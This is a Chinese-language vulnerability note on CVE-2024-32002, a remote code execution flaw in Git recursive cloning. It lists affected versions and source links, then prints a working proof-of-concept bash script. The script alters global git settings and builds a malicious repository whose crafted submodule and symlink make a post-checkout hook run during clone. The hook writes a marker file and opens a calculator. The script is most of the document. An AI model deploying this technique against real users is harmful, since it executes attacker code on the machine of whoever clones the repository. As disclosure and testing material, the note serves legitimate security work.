# CVE-2024-32002

>   Git是一个开源的分布式版本控制系统，用于敏捷高效地处理项目。Git还提供了许多其他功能和工具，如子模块、钩子等，这些功能使得Git在版本控制和管理方面非常强大和灵活。

## 来源

[https://github.com/amalmurali47/git_rce](https://github.com/amalmurali47/git_rce)

[https://amalmurali.me/posts/git-rce/](https://amalmurali.me/posts/git-rce/)

## 简介

Git中存在远程代码执行漏洞，支持符号链接的不区分大小写的文件系统上的递归克隆容易受其影响，威胁者可通过创建带有特制子模块和符号链接的恶意存储库，导致在git clone过程中执行恶意hook脚本，从而导致远程代码执行。

## 漏洞类型

远程代码执行

## 影响范围

-   Git 2.45 < 2.45.1
-   Git 2.44 < 2.44.1
-   Git 2.43 < 2.43.4
-   Git 2.42 < 2.42.2
-   Git 2.41 < 2.41.1
-   Git 2.40 < 2.40.2
-   Git 2.39 < 2.39.4

## POC

```shell
git clone --recursive git@github.com:amalmurali47/git_rce.git
```



```shell
#!/bin/bash

# Set Git configuration options
git config --global protocol.file.allow always
git config --global core.symlinks true
# optional, but I added it to avoid the warning message
git config --global init.defaultBranch main 


# Define the tell-tale path
tell_tale_path="$PWD/tell.tale"

# Initialize the hook repository
git init hook
cd hook
mkdir -p y/hooks

# Write the malicious code to a hook
cat > y/hooks/post-checkout <<EOF
#!/bin/bash
echo "amal_was_here" > /tmp/pwnd
calc.exe
open -a Calculator.app
EOF

# Make the hook executable: important
chmod +x y/hooks/post-checkout

git add y/hooks/post-checkout
git commit -m "post-checkout"

cd ..

# Define the hook repository path
hook_repo_path="$(pwd)/hook"

# Initialize the captain repository
git init captain
cd captain
git submodule add --name x/y "$hook_repo_path" A/modules/x
git commit -m "add-submodule"

# Create a symlink
printf ".git" > dotgit.txt
git hash-object -w --stdin < dotgit.txt > dot-git.hash
printf "120000 %s 0\ta\n" "$(cat dot-git.hash)" > index.info
git update-index --index-info < index.info
git commit -m "add-symlink"
cd ..

git clone --recursive captain hooked

```

## 免责声明

由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任。